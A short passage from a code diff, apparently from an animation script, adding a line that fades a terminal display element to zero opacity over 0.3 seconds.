+    terminalRef().opacity(0, 0.3),
   );
 });
